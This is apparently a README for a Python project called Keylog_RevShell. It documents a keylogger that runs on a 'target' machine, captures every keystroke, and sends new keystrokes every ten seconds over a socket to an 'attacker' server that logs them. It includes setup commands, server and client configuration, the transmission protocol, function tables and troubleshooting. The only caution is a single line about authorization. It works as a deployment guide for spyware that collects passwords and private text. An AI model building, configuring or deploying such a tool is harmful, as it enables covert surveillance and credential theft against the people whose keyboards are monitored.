# Keylog Reverse Shell Project

A distributed keylogging system with server-client architecture that captures keyboard inputs on a client machine and securely transmits them to a remote server for centralized logging and monitoring.

## Project Overview

This project consists of two main components:

1. **keylogger.py** - Runs on the target/client machine to capture keyboard inputs
2. **key_server.py** - Runs on the attacker/server machine to receive and store keylog data

The system uses socket-based communication to establish a persistent connection between client and server, enabling real-time keystroke transmission with automatic retry mechanisms and periodic synchronization.

## Features

### Client (keylogger.py)
- **Real-time Keystroke Capture**: Monitors all keyboard inputs using pynput library
- **Dual Format Logging**: Saves captured data in both JSON and TXT formats locally
- **Server Connection**: Automatically establishes socket connection to remote server with retry logic
- **Periodic Synchronization**: Sends only new keystrokes to server every 10 seconds (configurable)
- **Delta Sync**: Efficiently transmits only incremental data, not the entire log
- **Background Threading**: Operates keystroke capture and transmission simultaneously without blocking
- **Error Handling**: Gracefully handles connection failures with automatic reconnection attempts

### Server (key_server.py)
- **Socket Server**: Listens for incoming client connections on specified IP and port
- **Data Reception**: Receives keylog data from connected clients in JSON format
- **Persistent Storage**: Appends all received keystrokes to local JSON and TXT files
- **Timestamped Batches**: Records timestamp of each data batch received for audit trails
- **Multiple Format Support**: Stores data in both machine-readable (JSON) and human-readable (TXT) formats
- **Error Handling**: Handles connection errors and malformed data gracefully

## Project Structure

```
Keylog_RevShell/
├── keylogger.py          # Client application
├── key_server.py         # Server application (in Server/ folder)
├── Server/
│   └── key_server.py
├── keylog.json           # Local keystroke log (client)
├── keylog.txt            # Local keystroke log (client)
├── requirements.txt      # Python dependencies
└── README.md            # This file
```

## Installation

### Prerequisites
- Python 3.6 or higher
- pip package manager

### Setup Steps

1. **Clone/Download the project**
   ```powershell
   cd Keylog_RevShell
   ```

2. **Install dependencies**
   ```powershell
   pip install -r requirements.txt
   ```

## Usage

### Server Setup (Run First)

1. Navigate to the Server directory:
   ```powershell
   cd Server
   ```

2. Configure the server IP and port in `key_server.py`:
   ```python
   server('[YOUR_IP]', 4141)  # Replace [YOUR_IP] with your server's IP address
   ```

3. Start the server:
   ```powershell
   python key_server.py
   ```

   Expected output:
   ```
   [+] Listening....
   [+] Got connection from [client_ip]:[client_port]
   ```

### Client Setup (Run After Server is Ready)

1. Configure the server connection in `keylogger.py`:
   ```python
   connect_to_server('[SERVER_IP]', 4141)  # Replace [SERVER_IP] with your server's IP
   ```

2. Start the keylogger:
   ```powershell
   python keylogger.py
   ```

   Expected output:
   ```
   [+] Running keylogger Successfully
   [!] Saving the keylogs in keylog.json and keylog.txt
   [+] Establishing connection to server...
   [+] Connected to server at [SERVER_IP]:4141
   [+] Server connection established, starting keylogger...
   ```

3. The keylogger will now:
   - Capture all keyboard inputs
   - Save them locally to `keylog.json` and `keylog.txt`
   - Send new keystrokes to the server every 10 seconds

## Data Formats

### JSON Format (keylog.json)
```json
[
  {
    "pressed": "'a'"
  },
  {
    "Held": "'a'"
  },
  {
    "Released": "'a'"
  },
  {
    "pressed": "Key.enter"
  }
]
```

### TXT Format (keylog.txt)
```
pressed: 'a'
Held: 'a'
Released: 'a'
pressed: Key.enter
Released: Key.enter
```

### Server-Side Files

**keylog.json** (Appended data with all received keystrokes)
```json
[
  {...all keystrokes from all sync periods...}
]
```

**keylog.txt** (Timestamped batches)
```
--- New batch received at 2025-11-30 12:34:56 ---
pressed: 'h'
Held: 'h'
Released: 'h'
...

--- New batch received at 2025-11-30 12:35:06 ---
pressed: 'e'
...
```

## Configuration

### Adjustable Parameters

**In keylogger.py:**
- `send_interval = 10` - Change this value (in seconds) to control how often data is sent to server
- Server IP and Port in `connect_to_server()` call

**In key_server.py:**
- Server IP and Port in `server()` call
- Add firewall rules to allow incoming connections on the specified port

## How It Works

### Connection Flow

1. **Server Initialization**: Server starts listening on specified IP:Port
2. **Client Connection**: Client attempts to connect to server, with automatic retries every 5 seconds if refused
3. **Connection Established**: Once connected, both processes maintain persistent socket connection
4. **Keystroke Capture**: Client starts capturing keyboard events
5. **Periodic Sync**: Every 10 seconds, client sends only new keystroke data to server
6. **Server Storage**: Server receives data and appends it to local JSON and TXT files

### Data Transmission Protocol

```
Client sends:
{
  'type': 'keylog_file',
  'filename': 'keylog.json',
  'content': '[{keystroke_data}]'  # Only new keystrokes since last send
}

Server receives and appends to:
- keylog.json (JSON array of all keystrokes)
- keylog.txt (Human-readable format with timestamps)
```

## Key Functions

### keylogger.py

| Function | Purpose |
|----------|---------|
| `connect_to_server(ip, port)` | Establishes socket connection to server with retry logic |
| `send_data_to_server(data)` | Sends JSON data through socket |
| `send_new_keylog_data()` | Sends only new keystrokes since last sync |
| `periodic_send()` | Runs in background thread, triggers sync at intervals |
| `on_press(key)` | Keyboard listener - captures key press events |
| `on_release(key)` | Keyboard listener - captures key release events |

### key_server.py

| Function | Purpose |
|----------|---------|
| `server(ip, port)` | Sets up socket server and waits for client connection |
| `send(data)` | Sends JSON response to client |
| `recieve()` | Receives and parses JSON data from client |
| `save_keylog(data)` | Appends received keystrokes to JSON and TXT files |
| `run()` | Main loop handling incoming data and storage |

### Important Notes:
- Ensure you have proper authorization before running this on any system
- Requires administrator/root privileges on some systems for keyboard monitoring
- Antivirus and monitoring tools may detect this activity

## Troubleshooting

### Connection Issues
- Ensure server is running before starting client
- Verify IP address and port are correct on both sides
- Check firewall settings allow communication on specified port
- Ensure both machines can ping each other

### Missing Keystrokes
- Ensure keylogger window has focus to capture keystrokes
- Check file permissions for keylog.json and keylog.txt
- Verify send_interval is not too long

### Server Not Receiving Data
- Check console output for error messages
- Verify network connectivity between client and server
- Ensure server IP is accessible (not localhost if on different machines)

## Dependencies

- **pynput** (1.7.6) - Cross-platform keyboard input library

All other modules are part of Python standard library:
- `socket` - Network communication
- `json` - Data serialization
- `threading` - Concurrent execution
- `time` - Timing operations
- `datetime` - Timestamp generation
- `base64` - Encoding/decoding
- `os` - Operating system operations


